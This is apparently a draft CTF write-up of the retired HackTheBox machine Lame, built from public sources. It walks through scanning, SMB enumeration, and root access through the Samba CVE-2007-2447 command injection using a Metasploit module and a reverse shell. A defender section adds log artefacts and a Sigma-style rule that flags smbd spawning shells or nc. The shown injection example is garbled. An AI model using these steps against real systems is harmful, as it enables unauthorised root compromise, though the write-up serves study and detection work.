---
title: "WriteUp: Lame — HackTheBox | Easy"
slug: writeup-htb-lame
status: draft
tags: [ctf-writeup, hackthebox, easy, teaser]
excerpt: "An easy Linux HackTheBox machine. Full walkthrough in preparation."
format: html  # body is Ghost-ready HTML; restore via Admin API posts?source=html
---

<h1 id="lame-%E2%80%94-hackthebox">Lame — HackTheBox</h1><blockquote><strong>Preparation stub.</strong> Based on publicly documented information about this well-known retired<br>machine — not an original solve, and no live flag values are recorded. Use this as a study<br>scaffold; complete the bracketed fields when working the box under your own account. Only<br>document legally authorised activity.</blockquote><h2 id="engagement-metadata">Engagement metadata</h2><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Field</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>Platform</td>
<td>HackTheBox</td>
</tr>
<tr>
<td>Machine</td>
<td>Lame</td>
</tr>
<tr>
<td>Difficulty</td>
<td>Easy</td>
</tr>
<tr>
<td>Category</td>
<td>Linux</td>
</tr>
<tr>
<td>Target IP</td>
<td>10.10.x.x (lab-assigned)</td>
</tr>
<tr>
<td>Date completed</td>
<td>[YYYY-MM-DD]</td>
</tr>
</tbody>
</table><!--kg-card-end: html--><h2 id="executive-summary">Executive summary</h2><p>A legacy Linux host (Ubuntu 8.04-era) running Samba <strong>3.0.20</strong>. The "username map script"<br>command-injection vulnerability (<strong>CVE-2007-2447</strong>) allows unauthenticated remote code execution<br>as <strong>root</strong>, because <code>smbd</code> processes the username field through a shell when <code>username map script</code><br>is configured. There is no privilege-escalation step — the service runs as root, so the foothold<br><em>is</em> root. The box's exposed <code>vsftpd 2.3.4</code> banner is a deliberate rabbit hole; its backdoor is<br>not exploitable here.</p><h2 id="key-vulnerability-class">Key vulnerability class</h2><ul><li><strong>CWE:</strong> CWE-78 — OS Command Injection.</li><li><strong>Identifier:</strong> <strong>CVE-2007-2447</strong> (Samba <code>usermap_script</code>), affecting Samba 3.0.0–3.0.25rc3.</li><li><strong>Why it matters:</strong> a textbook "map the service version to a known exploit" case. The whole path<br>turns on reading <code>smbd 3.0.20</code> from the scan and knowing it predates the fix — methodology, not<br>tooling, finds it.</li></ul><h2 id="1-reconnaissance">1. Reconnaissance</h2><pre><code>nmap -sC -sV -p- -oA nmap/lame 10.10.x.x
</code></pre><p>Expected exposed surface (confirm on completion):</p><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Port</th>
<th>Service</th>
<th>Version</th>
<th>Note</th>
</tr>
</thead>
<tbody>
<tr>
<td>21/tcp</td>
<td>ftp</td>
<td>vsftpd 2.3.4</td>
<td>Banner bait — backdoor not working on this host</td>
</tr>
<tr>
<td>22/tcp</td>
<td>ssh</td>
<td>OpenSSH 4.7p1</td>
<td>Old, but not the path</td>
</tr>
<tr>
<td>139/445 tcp</td>
<td>smb</td>
<td>Samba smbd 3.0.20</td>
<td><strong>The vector</strong></td>
</tr>
<tr>
<td>3632/tcp</td>
<td>distccd</td>
<td>distccd v1</td>
<td>Secondary path (CVE-2004-2687)</td>
</tr>
</tbody>
</table><!--kg-card-end: html--><p>[Paste trimmed scan output on completion.]</p><p><strong>nmap flag rationale:</strong></p><ul><li><code>-p-</code> — scan all 65,535 TCP ports. Never assume a service sits on its standard port; high ports<br>are the classic "stuck for an hour" miss.</li><li><code>-sV</code> — service/version detection. On this box the single load-bearing fact is the banner<br><code>Samba smbd 3.0.20</code>; the version <em>is</em> the vulnerability.</li><li><code>-sC</code> — run the default NSE script category (equivalent to <code>--script=default</code>). Cheap banner,<br>OS-discovery and config hints with no extra effort.</li><li><code>-oA nmap/lame</code> — write normal/grep/XML output so the version evidence is re-referenceable<br>without a noisy rescan.</li></ul><p><strong>What to look for in the scan:</strong> service banners that predate a known fix. <code>Samba 3.0.20</code><br>(2006-era) and <code>OpenSSH 4.7p1</code> both flag a legacy host — pivot straight to version→CVE mapping<br>rather than content enumeration. One ancient service is usually the whole path.</p><h2 id="2-enumeration">2. Enumeration</h2><pre><code>enum4linux -a 10.10.x.x
smbclient -L //10.10.x.x/ -N
</code></pre><ul><li>Confirm Samba version <code>3.0.20</code> (the version, not the share contents, is what matters).</li><li><strong>Ruled out:</strong> vsftpd 2.3.4 backdoor (does not trigger here); distcc is a valid alternate path<br>but lands as the low-priv <code>daemon</code> user and then needs a privesc — slower than the Samba route.</li><li>[Record share listing / null-session results on completion.]</li></ul><p><strong>What to look for after SMB enumeration:</strong> you are confirming the <em>version string</em>, not hunting<br>shares. <code>enum4linux</code> echoes the Samba banner in its session output — anything in the range<br>3.0.0–3.0.25rc3 is CVE-2007-2447-vulnerable. Null-session share access here is a bonus, not the<br>path; do not rabbit-hole on share contents once the version is confirmed.</p><h2 id="3-exploitation">3. Exploitation</h2><ul><li><strong>Chosen vector and why:</strong> Samba <code>usermap_script</code> over distcc — it yields root in a single step<br>with no privesc, the cleaner path.</li><li>The injection is delivered through the SMB <em>username</em> field (e.g. <code>/=</code>nohup ``), which<br><code>smbd</code> passes to a shell. <strong>[ATT&amp;CK T1190 — Exploit Public-Facing Application]</strong> → the shell<br>metacharacters are executed by <code>smbd</code> <strong>[ATT&amp;CK T1059.004 — Command and Scripting Interpreter:</strong><br><strong>Unix Shell]</strong>.</li></ul><pre><code># Metasploit path
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.x.x
set LHOST &lt;tun0 ip&gt;
run
# Manual path: smbclient/python that injects a reverse-shell payload into the username field
</code></pre><ul><li><strong>Shell lands as <code>root</code></strong> — no further escalation required.</li><li><strong>User flag:</strong> <code>[capture on completion]</code></li><li><strong>Root flag:</strong> <code>[capture on completion]</code></li></ul><h2 id="4-post-exploitation">4. Post-exploitation</h2><ul><li>Stabilise the shell (<code>python -c 'import pty; pty.spawn("/bin/bash")'</code>).</li><li>Both flags are directly readable as root (<code>/root/root.txt</code>, <code>/home/makis/user.txt</code> or<br>equivalent — confirm path on completion).</li></ul><h2 id="5-tools-used">5. Tools used</h2><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Phase</th>
<th>Tools</th>
</tr>
</thead>
<tbody>
<tr>
<td>Recon</td>
<td><code>nmap</code> (<code>-sC -sV -p-</code>)</td>
</tr>
<tr>
<td>Enumeration</td>
<td><code>enum4linux</code>, <code>smbclient</code></td>
</tr>
<tr>
<td>Exploitation</td>
<td>Metasploit <code>multi/samba/usermap_script</code> (or a manual injection script)</td>
</tr>
<tr>
<td>Post-exploitation</td>
<td>manual shell stabilisation</td>
</tr>
</tbody>
</table><!--kg-card-end: html--><h2 id="6-mitre-attck-mapping">6. MITRE ATT&amp;CK mapping</h2><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Tactic</th>
<th>Technique</th>
<th>ID</th>
</tr>
</thead>
<tbody>
<tr>
<td>Initial Access</td>
<td>Exploit Public-Facing Application</td>
<td>T1190</td>
</tr>
<tr>
<td>Execution</td>
<td>Command and Scripting Interpreter: Unix Shell</td>
<td>T1059.004</td>
</tr>
<tr>
<td>Privilege Escalation</td>
<td>(none required — service runs as root)</td>
<td>—</td>
</tr>
</tbody>
</table><!--kg-card-end: html--><h2 id="7-key-learnings">7. Key learnings</h2><ul><li><strong>Version-to-exploit mapping is the whole game on legacy boxes</strong> — <code>smbd 3.0.20</code> is the single<br>fact that unlocks the box. Always cross-reference every service version against known CVEs<br><em>before</em> trying anything noisy.</li><li><strong>Not every open port is a path</strong> — the vsftpd 2.3.4 banner is a classic distractor; recognising<br>a rabbit hole quickly is a skill in itself.</li><li><strong>Service account context matters</strong> — when the vulnerable service runs as root, "exploitation"<br>and "privesc" collapse into one step.</li></ul><h2 id="8-defender-perspective-%E2%80%94-logs-detection">8. Defender perspective — logs &amp; detection</h2><p>What this attack looks like from a monitored SOC, and the rule that would catch it. (This is the<br>offence→detection bridge a SOC-analyst role needs to see; see<br><a href="../methodology/ctf-methodology.md">../methodology/ctf-methodology.md §7</a>.)</p><p><strong>Log artefacts generated:</strong></p><ul><li><strong>Samba logs</strong> (<code>/var/log/samba/log.smbd</code>, <code>log.&lt;client-ip&gt;</code>): a session-setup whose username<br>field contains shell metacharacters (backticks, <code>nohup</code>, <code>/=</code>) — legitimate usernames never<br>contain <code>`</code> or <code>/</code>.</li><li><strong>Process telemetry:</strong> the injected command runs as a child of <code>smbd</code> executing as <strong>root</strong> —<br>an <code>smbd</code> parent spawning <code>/bin/sh</code>, <code>bash</code>, <code>nc</code>, or <code>python</code> is the anomaly; the SMB daemon<br>has no legitimate reason to fork an interactive shell.</li><li><strong>auditd <code>execve</code> records</strong> (if <code>-a exit,always -F arch=b64 -S execve</code> is configured) tie the<br>shell back to the smbd PID under UID 0.</li><li><strong>Network:</strong> outbound TCP from the host to the attacker's listener (reverse shell) in firewall /<br>NetFlow / Zeek <code>conn.log</code>.</li></ul><p><strong>Example detection logic (Sigma-style):</strong></p><pre><code class="language-yaml">title: Samba usermap_script command injection (CVE-2007-2447)
logsource: { product: linux, service: auditd }
detection:
  selection:
    ParentImage|endswith: '/smbd'
    Image|endswith: ['/sh', '/bash', '/nc', '/python', '/python3']
  condition: selection
level: critical
</code></pre><p>SIEM phrasing: alert when <code>parent_process == smbd AND child_process IN (sh, bash, nc, python*)</code>.</p><p><strong>Why it fires:</strong> the exploit <em>requires</em> <code>smbd</code> to execute a shell — the very behaviour the rule<br>keys on. Detection is high-fidelity (near-zero false positives) because the malicious behaviour and<br>the detection signal are the same event. Maps to <strong>ATT&amp;CK T1190 / T1059.004</strong>.</p><p><strong>Defensive controls:</strong> patch Samba (the only real fix); run <code>smbd</code> least-privileged; restrict<br>139/445 to trusted networks; alert on shell metacharacters in any authentication field.</p><h2 id="9-references">9. References</h2><ul><li>CVE-2007-2447 — Samba <code>username map script</code> command injection (verify scope before citing).</li><li>Samba 3.0.20 changelog / security advisory.</li><li>MITRE ATT&amp;CK T1190, T1059.004.</li></ul>
